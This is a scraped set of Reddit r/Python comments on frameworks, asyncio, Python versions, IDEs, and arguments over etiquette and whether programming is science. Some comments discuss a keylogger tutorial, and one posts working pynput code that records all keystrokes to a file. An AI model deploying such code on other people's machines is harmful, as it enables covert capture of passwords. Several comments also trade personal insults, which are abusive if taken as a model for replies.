To add to your research I'd recommend reading Joshua Bloch's slides on what makes a good API: [https://research.google.com/pubs/archive/32713.pdf](https://research.google.com/pubs/archive/32713.pdf) Also check out some of the posts from Doug too: [https://doughellmann.com/blog/2012/10/15/ods-grizzly-choosing-a-wsgi-framework-for-api-services/](https://doughellmann.com/blog/2012/10/15/ods-grizzly-choosing-a-wsgi-framework-for-api-services/) HTH.
What’s fabric ？ heard about it 
Whoever 'helped' you think 37 is old? You don't need to be hanging with them. 
&gt; the need to create user-defined loops is not obvious \*slaps table\* Thank you. I don't understand why python insists I have to mangle my own event loops. That's what interpreters are for!
Also source is not POSIX compatible, so the shell script in your earlier comment isn't correct.
Hey thanks, I have been exposed to requests but mainly for doing clients for REST. I did not know about some of those frameworks. Is there one in particular you would use for system interaction? &amp;#x200B;
Python 2 is the past 
&gt; There’s no one ideal or method required here in the subreddit. &gt; There should be one-- and preferably only one --obvious way to do it. 
A field that is actually a science does not need to claim it in its name.
That would have been nice 2 years ago; I say skip 3.6, maybe even 3.7, and go straight on to 3.8.
You get more for free with Django then flask but you are more locked into the Django way of doing things. Try both and see which one works for you. 
Flask for me. Django is oppressively opinionated in my experience.
I think in Python it's tree-view widgets that are used to implement what you're talking about. You should be able to do what you want with the zero-width column. With tkinter you can hide Columns that you don't want visible. Rows with different colors will be no problem in tkinter (I coded this very thing up earlier today) Tooltips on a per row basic I'm unsure of the best approach. In addition to the usual tkinter, Qt, WxPython as your choice for major frameworks, you may want to look at [PySimpleGUI](http://www.PySimpleGUI.org). The tkinter version will do much of what you want, but not all.
I mean, can I create an virtual env, install dependencies from pypi and export the whole thing to brython. For asyncio, something like, tasks = [ajax(url) for url in urls] async for response in asyncio.as_completed(*tasks): mydiv.append(response) 
then forward the video you lazy child
Or would I be better off learning Javascript and React?
Or would I be better off learning Javascript and React?
Best combo will be Django and React. Flask is missing several server-side essentials you'd have to make up for manually, or with add-ons. Templates alone are not enough for an interactive website.
It's not either/or. You need both server and frontend frameworks.
What's the difference building just using Django vs Django and React?
What if I was using only Javascript with React, is there still a need for Django?
Django provides a database, authentication, ability to run Python code, background processes, heavy code you don't want to run in the browser. It also provides a way to design web pages, where you call the server each update. React provides an interactive way to display webpages that runs in the browser.
Yes; see my other replies.
I think OP's thinking of server-side Node.
Okay, so when a button is clicked, that's when Javascript handles how the page should look? 
&gt;However, I do not agree that giving feedback is the same as being a dick. You can give useful feedback and be a dick at the same time, which is partially what I think OP's trying to convey. Feedback is usually appreciated, but don't be dry and harsh with it. Give the person a bit of praise and/or encouragement, then point his/her weaknesses and how they could improve it. I think a lot of commenters in this sub lack that courtesy. It is something small and simple, but being polite and encouraging while giving feedback can mean the difference between generating animosity and actually helping.
The best way to think of this is that you're writing Javascript with Python syntax, and some of the standard library ported to Javascript. Third party modules for cpython that do anything beyond basic tasks or data manipulation are unlikely to work. 
import dick
Hard to be critical when everyone gets offended. 
I just started using grequests. It works great if there is latency with an API, but if the API responds within a second then it seems it floods the server too fast. There's very little documentation so I'll probably have to move on from it. Using grequests one of my scripts went from taking 5 hours to as low as 20 minutes using 20 threads, although I didnt start to get blocked when the script finished. I tried grequests with walmart's open API and within a couple mins it started blocking. I'm thinking proxies would be better if the API is responsive.
Yeah that's what I was getting at. What are the main differences between Node and Django? Is it just the language that its written in? If so then wouldn't it make more sense for me to scrap Django and just get good at Javascript and learn React + Node.
No one is ever 100% right. There's legitimate sides to almost anything. Some more that others. I'm not all right in this situation. But I will say I'm leaning toward the majority in that category by a decent margin.
How prone to suicidal thoughts are you? If you don't have any, then sure Node + React, otherwise choose Django.
I think we can let the jury deliberate now. And by that I mean end this conversation. Not all you guys, but this is fuckin' pathetic. Don't even remember the argument now.
I read all the comments and that's the only one that's even remotely critical. This whole post should just be a reply to that guy if OP felt so strongly that his comment was out of line.
Short answer is 'no'. Things change too much to get settled on favourites, I always assess and re-assess what I might wish to use when I start a new project or re-factor an old one. Crap answer for you but it should help you realise you have to code your 'idea' in a few ways before you can be happy you've chosen the right framework for your task. Sometimes the answer is obvious, like which hashing algorithm should I use but with frameworks it's very subjective based on your experience and breadth of knowledge. Hence I wanted to guide you towards some theory first. If you can build a data model, before implementation, that will go a long way to helping you figure out which framework will be best: https://softwareengineering.stackexchange.com/questions/163185/torvalds-quote-about-good-programmer Though best advice ever is to just 'begin'. Try this one: https://moltenframework.com/v0.7.3/motivation.html HTH.
Right? If we were mentored back when we were "goofing off", who knows. :) Plus, nice to have something in common when coming in as the "step". ;) 
What post do you mean I've removed?
Thats weird. I am hearing impaired and videos worked just fine. Did u use the auto caption? 🤷🏾‍♂️
&gt;No one is ever 100% right. There's legitimate sides to almost anything. Some more that others. You are *0*% correct. Nothing. Zip. Nada. There are absolutes in life. Mostly those that come from physical and mathematical law, but also that of vocabulary. Can the term "computer science" change to at one point be literally equal to the term programming? Yes. Is it right now? No. Computer science is the theoretical where programming is one place where one can apply most of the theoretical in a practical way. They are so different that in countries outside the US they are actually different degrees (certification wise). Even in the US there are two forms of CS degrees, in art and in science. Generally, when a university offers both and they are significantly different, the science/art follows the same theoretical/practicality aspect. You can be a computer scientist. You can be a programmer. Being one doesn't automatically make you the other. This isn't something that a couple people on reddit are screaming at you for. Look this up anywhere. You will find more than plenty responses of people saying the exact same thing. If you said "most computer scientists happen to be programmers", you'd be correct, because programming encompasses the majority of practical applications to the theoretical. But anything else, including the whole equivalency debate that you started here, is definably wrong.
Exactly my point
Start with flask but if your project gets larger with things like many different views or different subdomains go with Django. 
The async implementation for Python is horrendous. Of course it's better than nothing but still horrible. * Tasks, Futures, Coroutines are ass backwards from their same named counterparts in other languages. * getting them to work together is a mess * there's an unnecessary rift between coroutines and everything else called the coroutine object, which holds quite literally no use on it's own * there's no default event loop, and by default event loops block on the thread in which they are created/get a start signal (forgive me, I forget which) * the asyncio library is now seen as low level, whereas originally it was seen as quite high level with the now deprecated asyncore and asynchat libraries being the low level counterparts. Curio solves the perspective of low level IO and trio solves some of the loop caveats and interop, but other than that nothing else. I have a thin decorator based wrapper in development to solve all but the low level vs high level aspect, but work gets in the way of completing it.
I would first learn a frontend language- HTML and CSS. They're easy to learn but sometimes hard to master. You could also learn ReactJS but you will also have to learn JavaScript. Then pick up a python web framework: (assuming you know Python) flask or Django. Personally if your site is going to be pretty big I would use Django. If it's like single paged I guess use Flask. If you're learning Django, djangogirls.com has a great tutorial called Creating a Blog in Django or something, Google it. That's how I started. Good luck!
You didn't need parenthesis in python 2.
I've got some down time at work and I want to learn Python so I decided to convert a VBA/Excel/Selenium macro we use into one with Python/Not Excel/Selenium. Doing this was helpful in picking up the basics of C# and VBA vs VB so I figured I'd try it for Python. &amp;#x200B; All of the new hires we get who have any type of programming background are familiar with Python and my best friend programs in it professionally and gave it a recommendation so I figured why not. The pettest of pet projects. My company is never leaving Microsoft Office. If anyone asks I'll say it's *future proofing the critical tools we use everyday in a language used by many!* &amp;#x200B; The power of indents and what looks like unclosed loops is frightening coming from what I'm used to, but other than that it's going well.
That’s cute and all, but PyPy 3 is stuck at 3.5 support and still considerably slower than PyPy 2.
Before his edit, it was basically "works for me"
Oh, thanks, fixed it.
You can do that all in python/pyside. You hide the elements in the row/column to hide the row vs doing it directly, but it works.
Yes is joke.
&gt;Give the person a bit of praise and/or encouragement, then point his/her weaknesses and how they could improve it. This just isn't how humans interact. We aren't here to constantly shower people with praises while giving feedback.
The best way to read an excel file and manipulate the data is with pandas: `pd.read_excel(path)`. For plots I'm not sure what interfaces best with tkinter. With matplotlib or the libraries built on top of it (e.g. seaborn) you can save as png or other image formats. In some cases it is really convenient to output the plot to HTML, in which case Bokeh is great.
I really don’t want to save them or output them, except in a new Tkinter window 
I know many humans who interact with others in the way previously described. They are some of the best teachers that I've known. There is no need to constantly shower people with false praise, but there are more constructive ways to offer suggestions.
We just fired a competent developer because everyone just found him difficult to work with. He would say stuff like "Being critical is not the same as being a dick". I think in his mind it was impossible to be rude if you were correct. 
lol to other subs?
Sorry for the late reply I was out for the holidays. Also I honestly don't know what snd or sth are or stand for, but I only have a few days of experience in python, but before I started I had a few months of experience with visual scripting (specifically blueprints in unreal engine 4) and the thought process is pretty similar, so that definitely helped. Hoped this answered your question :)
Being critical doesn't have to be done rudely.
Try taking some CS classes at a community college. Or anywhere, really. It’s super common to find old dudes who are wizards at algorithms and discrete math but are effectively technically illiterate. It’s even more common to find academics who have dedicated their lives to theory but are terrible programmers who don’t also don’t particularly care about various tech implementations. The best algorithms course I’ve ever taken was put on by a dude whose highest use of tech was an overhead projector and plastic slides.
&gt; BA is probably for an education sector of Comp Sci, maybe even a legal avenue or reporter Lol, no. Just no. Stop talking about shit that you have zero knowledge of.
It sure doesn't
Duuuuude I'm done, fuck off. I was obviously guessing. Fuckin said it's a counterintuitive concept in the first place. Now I get petty: go take your sexual frustration out somewhere else. You being a virgin isnt my problem. Stop making it mine.
No explain this. I'm intrigued. Because you made my point: programming is just another one of math's creations. From the Pythagorean theorem to building super computers. The applications are endless. Correct me if I'm wrong, but a programmer....programs. Particle Physicist and advanced mathematics are simply different professionals. They bring the theory, the brains to the programmers. Add the programmers make it real life. I just don't know why this is a discussion. I really, really, really don't
I missed the biggest point: "those who can't do, teach. ANd those who can't teach, teach gym class." First part is a TRUE statement and the last piece I added is from School of Rock with Jack Black.
Programming is not science. Yes, math and science brought us the technology that underly the technology that programmers use, just like it underlies the technology that medical doctors like surgeons use. Surgeons are not scientists. They are technicians. Graphic designers also use computers and technology to creat things. They are not scientists. They are artists. Programmers are engineers. Not scientists. Engineering and science are different disciplines.
“Instead of gracefully admitting that I was wrong and being an ass about it, I’m going to call the other person a virgin and slink off. Heh!” I’m glad you stipulated that *now* you’re getting petty. That’s funny too.
The world doesn't work this way. You don't get a compliment for every critique.
Oh, baby. That was just warming up. I have a tongue like a knife. Ask my ex girlfriends lol. It's a gift, I guess.
Humans interact in multiple ways. In my years of living, I've found that trying to be more friendly and less harsh tends to make people more willing to listen to you. If you're going to give feedback, then the assumption is that you want to help the person. So why don't go all the way trying to make them interested in what you have to say by being friendly instead of sounding like a bitter middle manager that is pissed with his subordinates because they can't read his mind? If the best you have to say to someone is "your product/code is bad", then it's likely that your feedback is less worth than no feedback at all.
I like your persistence, but your view isn't everyone's view.
I pick locks and own multiple picklocking kits. Am I doing it because my intent is to be a burglar and break into houses? No, I do it because a) I like the challenge and b) it’s calming to me. Likewise a keylogger isn’t for stealing someones password. But making one lets me learn how to control and monitor mouse and keyboard activity, and gives insight into how these infamous keyloggers actually work.
If you even want to be remarkable at your trade, you better know the science. I fucking reac that from Guido. You're going back to semantics again. I understand it's just how you've framed those words. I frame them differently. I didn't spend 1700 hours in a year and a half on my IDE to go be a fucking technicial. I want to build something awesome that changes lives.. Not take call from employees and being a bug monkey. Surgeons are absolutely scientists. My uncle was the Gastroenterologist and THE Mayo Clinic. He was considered the best in the world in his field. He's dead now and I won't cheapen his legacy by going over the superstar athletes he treated and people we all are very familiar with in politics, pop-culture, etc. Point is, I think of doing something and apply myself, in this case, the act of programmingm I think of being like my Uncle Dave. The best, I got into this trade on my own and did nothing else because I have a vision for it. Not just an end game for a desk job. So maybe no you can see how our views shift.
It's completely recursive... Perhaps best to just go with "Don't tell other people what to do, other than telling them not to tell other people what to do"
Database design will matter 1000x more than either web middleware or frontend framework choice.
When I first delved into programming I used Excel VBA. One of the first things I did was make my coworkers Excel sheet let out a 3 minute repeated Beep everytime he opened the Excel file. So yeah, just like the first words you learn in a new language is the swear words, the first things you when new in programming is doing pranks. Make mouse go haywire, turn off screens, make beeping sounds, open/close programs. All that fun stuff. We all did it. Well, most of us I guess. Either way it is generally just pranks and good natured fun.
&gt; I want to build something awesome Again, you’re describing engineering. Not science. Science would involve research and discovery, not creation. &gt; Surgeons are absolutely scientists. My uncle ... Mayo Clinic ... best in the world. You’re continuing to make the mistake of thinking “scientist” means anyone who does something that’s challenging technically, or involves applying technology in their jobs in a way that requires creativity (programming) or rote practice and experience (surgery). The best surgeon of whatever type is not practicing science daily, they’re doing surgery and relying on other scientists to push the field forward in ways that they can use to help patients. I do see how our views are different, and the point as you’ve identified is that we’re using the word “scientist” differently. I strongly believe that you’re using it incorrectly. Words are important. That’s why the dictionary exists. Anyway, best of luck in your pursuits, be they engineering or science. 
 if (dirtyTalk == True): print(hogs)
I wouldn't use Conda as a package installer, save for if you really need some of those Conda specific packages then `conda install &lt;package&gt;. I would recommend Conda as a environment manager and Pip as your package manager if using Conda. That said, I don't know exactly what specific use case is required here. And would it matter: - Data Science -- e.g. multiple environments on multiple clusters of spawned instances, often containerized that depend on other binaries --&gt; Conda/Pip for sure. - web apps -- e.g. Flask or Django --&gt; here I'm not sure. I'm more familiar with the former. Would love to hear anyone's experience with the latter. Here's an insightful writeup on someone's experience with Pipenv. https://chriswarrick.com/blog/2018/07/17/pipenv-promises-a-lot-delivers-very-little/ 
Check out Mike Driscoll's blog (/u/driscollis): https://www.blog.pythonlibrary.org/
I wonder, will 3.x be compatible with 4.x or will they create all this drama again?
https://python3statement.org/
stop making comments. 
&gt;&gt; What you linked doesn't actually address that. The usage of self is a different issue. &gt; Then I don't understand your question. What I wondered about were the reasons for not creating a local lexical scope in class body definitions. The "self" argument allows instance attribute access to be unambiguous, and allow defining instance methods outside the class, all without special syntax. I don't see what prevents both this mechanism and class body lexical scoping to coexist. Like I said, I don't really disagree with your proposal.
How does the JS get to the browser without Django? Diskettes?
Writing a bytearray should do it, something like `lcd.write(bytearray[0xFE, 0xD0,...])`.
This has nothing to do with views. It has to do with reality and managing expectations. Only your parents and maybe teachers will coddle you the way you're describing.
Saying "an article would be better" isn't bitter. This is insanity. People on reddit get offended by constructive criticism and lack of overbearing comments quicker than by actual slurs and blanket rude remarks. What backwards SJW culture is coming to reddit?
Yep, building kivy apps sucks. True for Python in general (getting antiviruses flag my builds for no reason? Fiddling with options for like two hours? Having to manually copypaste DLLs for CFFI libs?), but kivy for android is particularly bad.
Good.
How do I upgrade to 3 just got pycharm 
Why do you insist on fighting with a straw man? I'm certainly not saying that you need to give a compliment for every critique. But there are ways to couch criticisms. I'm an instructor, I have plenty of practice with it.
Nice 
Basically people ask how to do very simple probelms in Python 1000 times a day in this subreddit. It goes in r/learnpython
I personally don't like most video tutorials--there are a few people who seem to do them well but most are just crud. However, in defense of the original video he does actually have a git repo of the code if you go to the actual you tube version. However, however, in defense of the "dicks" the git repo for the keylogger is a total of 28 lines including 12 lines of white space and comments. The poster did about 8 three minute "tutorials" to cover 16 lines of code and 8 of those 16 lines are literally . . . if letter == 'Key.space': letter = ' ' if letter == 'Key.shift_r': letter = '' if letter == "Key.ctrl_l": letter = "" if letter == "Key.enter": letter = "\n" Sorry--this simply is not quality stuff. Particularly video quality stuff. I personally laugh and cry at the same time over how many damn "echo server" python socket tutorials (written) there are but I'd be fairly content if this sort of post/content got down voted to oblivion. This isn't 4th grade soccer and there aren't any trophies for participation.
Thanks for suggesting about dash. I would definitely give a shot on dash.
Glorious! My fiancee calls me a massive nerd when i do any kind of programming, she loves it!
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
The async implementation for Python is horrendous. Of course it's better than nothing but still horrible. * Tasks, Futures, Coroutines are ass backwards from their same named counterparts in other languages. * getting them to work together is a mess * there's an unnecessary rift between coroutines and everything else called the coroutine object, which holds quite literally no use on it's own * there's no default event loop, and by default event loops block on the thread in which they are created/get a start signal (forgive me, I forget which) * the asyncio library is now seen as low level, whereas originally it was seen as quite high level with the now deprecated asyncore and asynchat libraries being the low level counterparts. Curio solves the perspective of low level IO and trio solves some of the loop caveats and interop, but other than that nothing else. I have a thin decorator based wrapper in development to solve all but the low level vs high level aspect, but work gets in the way of completing it.
That's an easter egg in Python now. Try to importing the module `antigravity`.
...Not sure if I can trust this repo...
Changing the major version number usually mean that it will be backward copetabilliti issues, but not always.
Why?
I agree that dependency injection seems cleaner and more explicit than monkey patching. And modules are really limited in feature and general convenience compare to objects and classes, so they don't cover all usages of singletons. He doesn't say the iterator protocol is not useful, just that the explicit iterator interface is largely superceded by generator syntax for implementing iterators. 
No. 4.0 will follow 3.9 and should be incremental. The argument was that Python 2 string handling was fundamentally broken (if you were serious about encoding) and fixing it justified the pain of Python 3. It wasn't that long ago people were writing obits for Python 3... it's safe to say there's a good chance Python could have failed or fallen back to 2.x. My choice to write an all Py3 app in 2015 felt risky and half the dependencies I wanted were Py2 only. The core devs will not take that risk again. Steering committees like the newly chosen one tend to be risk averse, for better or worse.
I'm allergic to phish.
That's very good news, thank you!
Fuck you. You're exactly the person this post is talking about. You toss out insults like candy and then act offended that people are offended by it.
I used it to decide wifi password. Few phones have feature to share wifi password using QR codes, I got the qr code, not the password, so I'd to...
&gt; So why don't go all the way trying to make them interested in what you have to say by being friendly Because in my experience, that doesn't work anywhere even remotely as well as being honest and direct. Many of the best mentors I've ever had have been assholes- sometimes you learn a decent amount from them of what not to do, too. Does that approach work for everyone? No. Do I need to write encouraging fluff/bullshit in my reddit posts in order to account for everyone? Also no.
&gt; It seems silly and useless to say that it's in the "wrong format" No one said this except you, though. That's called a strawman argument. A user expressed a preference; a lot of people agreed with it. If anyone finds either of those things rude, I assuredly don't care.
Do you mean like IDE? VS Code is nice.
Roast me but what exactly is an IDE,I have searched all around and didn't understand
From what I noticed, people create videos to get potential earnings on YouTube, not because they are good video content creators.
Read up on Brython. Python for web browsers or perhaps you need to look in to learning JavaScript and duplicate your work that you’ve done in Python.
I don't really agree with him. You don't need to use vim to learn to program. An example of an IDE would be Atom or VS Code.
IDE - Integrated Development Environment, this is where you'll type up your code and execute it. A nice IDE for students is "pycharm educational" Popular ones are "anaconda" and "Jupyter labs" Best of luck!
Please don't take everything Zed Shaw says as truth. Also, please don't use LPTHW as your primary learning source. Also, an IDE is an Integrated Development Environment - basically a very fancy text editor with lots of features specifically for editing code, navigating your project, moving code around without breaking things, debugging, that sort of thing. The reason many authors tell people to stay away from IDEs at first is that they're generally professional tools, and the user experience can be overwhelming at first. It doesn't _have_ to be that way though - [Thonny](https://thonny.org/), for example, is an IDE that's designed specifically for beginners.
no one gets dynamic typing and I wouldn't be in python without it
Any IDE or editor that your comfortable with works. For quick work I use sublime + Ipython this is also my learning setup. Once I get better I know I'll be using pycharm. 
Thonny looks great. =) 
Oh come on, it only took 10 years after all.
&gt; "Your complaints are premature and overzealous." Sorry, fixed.
I'm very thankful to the pandas developers for everything they do. (I myself use python 3 anyway.)
Thanks! :)
Thanks 👍
Ohh that's great! Also you said about not keeping LPTHW as a primary source , what would you recommend ? I know the basics just needed something a level above Shaw's book.
Ok, so assuming you're the author and notwithstanding my desire to assure you that the little bit of boilerplate at the bottom of LICENSE won't do much to actually protect you from liability if someone actually uses this for evil, _why_ post this here -- specifically -- before you've refactored it into an at least marginally professional form? I mean okay you've managed to glue together an os.system call to wget, an re.sub you already know is the wrong way to do it, and a trivial http-only request handler (though you imply it will handle https), but hell even your colored print statements are done in a fashion that seems to completely ignore the idea of DRY. This is brittle and clearly not up to the task of being an actual practitioner's pen-testing tool -- they'd all reach for mitmproxy anyway -- so I can only assume it's a calling card / resume piece, but for that you'd want to, at a minimum, get all your business logic out of the global namespace, stop repeating yourself (and ideally use **logging** and only do the color formatting once you're sure the user's TTY actually supports it, and even then as an option), and just generally not rely so damned much on **os.system** (which should really be direct calls to **subprocess** anyway). I mean you know Python can delete directory trees and also do recursive downloads, right? And do both cross platform? Cause anyone you want to impress with your skillz will. Not trying to be harsh, but this is the sort of fluency I'd expect of someone who has been using Python for a couple of months and never professionally. Without additional context it's confusing why you're posting it here; as a basic primer on how a phishing proxy works -- and _not_ an example of good Python -- it could work, but you don't seem to have used it in support of an article or post on that topic. Are you looking for code critique? If so that could be more clear in the post itself.
Jupyter Notebook is great for learning and prototyping. Spyder (Spyder3) are also great for that, plus it's easier to stay with for beginners. Once you get to writing more than just prototyping, you might want to switch to `visual studio code` with a Python plugin. I think it's great for everything but large monolithic applications that are out of fashion anyway.
It is possible with both. But for something like this, Django just seems to be the better choice. A ton of built-in stuff that you will need along the way. Getting started with Django will take a bite more time, but that is time well spent.
Not really. You seem to be a bit confused what the different moving parts on frontend/backend are. I suggest you start with Django rendering plain html + css for starters.
I agree with most things, but fortunately as the mess of generator-based coroutines, concurrent.futures, asyncio.coroutine decorator, and native coroutines being settled in favor of the native versions, it’s getting cleaner starting with 3.7. But: &gt;there's no default event loop, `asyncio.get_event_loop()` returns the default event loop &gt; and by default event loops block on the thread in which they are created/get a start signal (forgive me, I forget which) Why is that a problem? That’s the case with every GUI framework and event based servers I’ve worked with, in many languages. 
Please don't turn python into the next NodeJS.
Just to elaborate on the other guys response, an ide is not just where you edit the text but where you can do other things debug as well. You have a variety of features to you code. idle is provided with python but is a pretty basic text editor but VS CODE and others will let you see a list of you variables/functions which you can click on to jump to their declarations, they tend to have autocomplete so if you type something like "if" then you will get a series of suggestions you can click on any it will fill the syntax in for an if statement for you. Debugging options so you can pause your code in real time and few the values of the variables, etc. Yesterday I found a cool extension in VS Code that means any comment that starts with TODO: gets added to a list so I can quickly go back to areas that I haven't done yet. Its all these things which is why an IDE is so much better than your basic text editor for writing code. It's the a package of tools. :)
That's great ! I did start using Spyder few days ago but discontinued , because I read it was more for scientific purposes.Which made me think that it may not provide necessary functions in general. And btw why are large apps out of fashion ?
Beginner to programming here. Just started learning the complete basics of python using an app called py - learn to code on iOS. Any advice or help would be appreciated. 
It's necessary to include your operating system when asking questions like this, but the answer to your question in particular is available on various search engines. Essentially you need to install Python 3, then create a new virtual environment in PyCharm using Python 3 as an interpreter. https://askubuntu.com/questions/1003659/how-to-add-python-3-x-interpreter-in-pycharm
I'd say the the bigger reason that many teachers/authors say that is, rather than it maybe being overwhelming, that it can cause newbies to not learn things that they should have learned. For example: Pycharm will always make a virtual environment for every project, so all libraries you use will be specific to that environment, specific to that project. This is good practice, and very nice of Pycharm to do so. But this happens all automagically and newbies have no clue about virtual environments. Then later they try to run their project from the command line as a test, and they can't figure out why their program doesn't work. Authors/teachers suggest to not use IDEs so newbies will actually learn about things before letting IDEs do it for them.
That's their problem though. It shouldn't make life harder for the rest of us.
You're probably using 3
&gt; `asyncio.get_event_loop()` returns the default event loop Right, but it still has to be fetched. In an ideal world calling some async function foo() would internally skip the unnecessary coroutine object step and submit it to the default event loop. &gt; Why is that a problem? That’s the case with every GUI framework and event based servers I’ve worked with, in many languages. Can you give an example? I'm referring to the fact that in other languages asynchronous code is asynchronous from any synchronous code around it. But in Python that's not true, because the thread is blocked while the event loop is run.
Actually, the editors that call themselves IDEs are designed for beginners. It's their major selling point. They are easy to explore on your own, without instructor and very little prior knowledge required. They become uncomfortable and get in your way the more you know about your field.
Looks like PyCharm. &amp;#x200B; [https://www.jetbrains.com/pycharm/](https://www.jetbrains.com/pycharm/)
Have a read of some of the links at https://python3statement.org/ which explain why things broke. As /u/Zomunieo states string support is a major factor.
There's no such thing as "not completely wrong", just like there isn't "not completely pregnant". But you didn't bother to read what I wrote, so why bother reiterating to you why you are wrong?
Python doesn't strictly follow semantic versioning.
Apparently the code I posted didn't work properly... &amp;#x200B; This actually works. Just add in whichever special keys needed in the **bad\_keys** list to make those keys be ignored (returned as blanks). from pynput.keyboard import Listener def write_to_file(key): letter = str(key) letter = letter.replace("'", "") bad_keys = ['Key.shift', 'Key.backspace', 'Key.shift_r'] #add any Key.something to this list to make that particular keypress be ignored / returned as blank. for x in bad_keys: #checks the list for special keys and assigns them as a blank string. if letter == str(x): letter = "" if letter == 'Key.space': letter = " " if letter == 'Key.enter': letter = "\n" with open("log.txt",'a') as f: f.write(letter) with Listener(on_press=write_to_file) as l: l.join() &amp;#x200B;
If rhel 8 is going to support python2 then in 10 years there will still be python 2.
&gt; Right, but it still has to be fetched. In an ideal world calling some async function foo() would internally skip the unnecessary coroutine object step and submit it to the default event loop. Gotcha. Now there's asyncio.run which is a step in that direction. One could also argue that "explicit is better than implicit", but I wouldn't exactly agree with that because I also find the API messy. &gt;Can you give an example? I'm referring to the fact that in other languages asynchronous code is asynchronous from any synchronous code around it. But in Python that's not true, because the thread is blocked while the event loop is run. The Qt GUI framework, in all its supported languages (C++, C#, Go, Rust, Python, many others) always explicitly begins the event loop [with a blocking `app.exec()` call](https://doc.qt.io/archives/3.3/tutorial1-01.html). The nginx web server (C) has a master process that [spends its time in a blocking call](https://nginx.org/en/docs/dev/development_guide.html#event_loop). Having a blocking infinite loop is pretty much necessary to handle events asynchronously, the difference is how much effort the language makes to hide it from you by creating another thread. Python never spawns more processes/threads if not explicitly told.
If is for scientific purposes, but do is Jupyter. Ask not the purpose of something, but what it can do. Just because JavaScript was made to manipulate DOM doesn't mean that everybody should stop using it as anything else. As for large monolithic systems - they're hard to maintain and require poorly motivated decisions, like "we have to keep using VB6 because it's too expensive to migrate the whole monolith to something new". With a micro service architecture you can change what you like as long as it still integrates the same way with the rest of the infrastructure. They're easy to write, maintain, destroyed, rewritten.
Oh, I didn't knew about virtual environments, but I always install libs using command line anyway 😅
Major drama again could cause a major exodus of developers.
Thanks again, I felt I was misusing a service !
Who needs IDEs when you got vim and shell scripts?
It'd be nice if there was a rule requiring a short submission statement in a comment when someone links a repo.
Did someone tell you *"yeah, you can rebuild my fancy spreadsheet in that python thingy, as long as it looks and works like this spreadsheet application I'm using right now, it's fine by me"*?
I absolutely disagree - I think IDE's are fantastic for beginners. Things like code completion, syntax highlighting and the ability to see expected arguments makes coding a lot easier when starting off. Many have other features that are useful, such as showing the structure of your program, easy refactoring and, possibly more useful than everything else when starting off - highlighting 'inwords'/reserved words so you don't try to make a variable of a reserved word! There are two downsides though; firstly IDEs can, as K900/hai\_wim pointed out, be a bit overwhelming. It's something else to learn on top of programming, and there's a lot of stuff in them that is unnecessary for the beginner. Secondly, and more importantly, they tend to do a lot of stuff to help behind the scenes. Some will even ignore incorrect coding (like allowing print without brackets in python3) to be 'helpful' - this isn't good as a beginner but it's offset by how much more accessible IDEs make coding.
One challenge that I learned a lot from was making a Hangman game. I learned how to pull random words from a dictionary.txt file. I learned how to slice a string so that only the words guessed correctly would be printed out and show to the person making the guesses. I learned how to append letters to a list and check new letters guessed against that list to see if the letter had already been guessed or used. There were actually quite a lot of things to take into consideration when making something as "simple" as a hangman game. I really recommend doing that if you are new :)
I'd recommend Tkinter with [Pandastable](https://github.com/dmnfarrell/pandastable) It does all of that very easily, and tons more besides if you decide you want it. Only downside is it's a little bit heavy, but it's well worth it if you're doing anything spreadsheet wise.
There is this autohotkey python library that kinda does the same. Maybe it works for you.
Most of your functions are pretty short; a single playlist.py file would be fine. Normally for a package your entry point would be either a file with the name of the package, or a folder where __init__ imports the public parts of the supporting source code. 
Here are some pointers: 0x1001054a0 0xf00208320 0x200102800 Just kidding. Check out decbis answer ;)
Nice move.
Actually, it has absolutely nothing to do with spreadsheets - or anything remotely related to office stuff
Wouldn't 3.10 follow 3.9? Why change to 4.0 if it doesn't break anything?
It’s not so much that people get offended as people have an urge to always voice their opinion even if, or maybe especially if, they don’t like something. Example; you prefer Python 2.7 over 3.x then go into threads about Pyhton 3.x just to say you dislike it and prefer 2.7. It’s like walking down the street and seeing a poster for piano lessons, then go out of your way to go to the piano place and proceed to yell at them about how you hate piano music and prefer electric guitar. To me it is just ludicrous. If you don’t like something then walk on. But online where it is just three clicks away people tend to jump in and “express” themselves. It’s a really weird world we live in today. 
```python def run(dirty_talk): if dirty_talk: print("He's not the Messiah, he's a very naughty boy!") else: print( "Listen, strange women lying in ponds distributing swords is no " "basis for a system of government. Supreme executive power derives " "from a mandate from the masses, not from some farcical aquatic " "ceremony." ) if __name__ == "__main__": run(True) ```
This is the result of both variables referencing the same location in memory. To get around it, try ```from copy import copy```. Then copy the list using the copy function.
Like all similar solutions, Kivy is great and seems really easy to use until you actually want to go from development to production and then you need to get out the pentagrams and goat entrails to make it package up. I never like to badmouth/insist on the direction of projects where people have given their time to it freely, but I honestly feel like they could do with changing the focus of development to 'how can we make this simple to compile'. In my opinion, it's the biggest problem with Python in general - packaging anything even moderately complex up into distributable software is a nightmare; it's just doesn't seem to be the focus of python. Whilst that's fine to a point, it dramatically hinders the ability for it to be used more widely. 
99% of people don’t need to worry about optimization. http://wiki.c2.com/?PrematureOptimization I will bet anything that flask will never be the bottleneck in your api. 
Do you know what make is? Makefile?
Great to hear - the sooner the community can just be 'python 3' the better. It's confusing for beginners, annoying for the more experienced and must be hellish for package developers. What always annoyed me about the changeover to py3 was that people act/acted like the 2.7 compatible versions of the libraries they used would somehow disappear from the internet entirely - they'd just be scorched away in some sort of great py3 cleansing ritual never to be used again. If you so much as looked at a 2.7 wheel a giant snake would erupt from your old fashioned computer and lecture you on the need to get with the times and the glory of the great god unicode.
This second example works as expected. The "=" is assignment expression, it assigns a new value to a variable (in your case it assigns a new list to variable labeled "a"). Variable b, on the other hand, remains unchanged (you did not assign a new value to it) and it is not modified by assigning a new value to variable a.
Cool, that makes sense! Thanks.
Ah yes, the memory reference. Thanks for clearing that. That's why it's good to know low-level languages like C++ that help you understand how high-level languages work.
Me too, but that wasn't what someone decided to pay for. 
Hi, I'm new to this and as a n00b it would be good to have a sticky for beginners. Especially as this language is frequently people's first language.
This is good don't have anything running in 2...
Exactly. Flask is intentionally very "thin", it only wraps the http basics. All business logic is bound to be more expensive.
I'm not saying that it's rude, I'm saying that it's not good criticism.
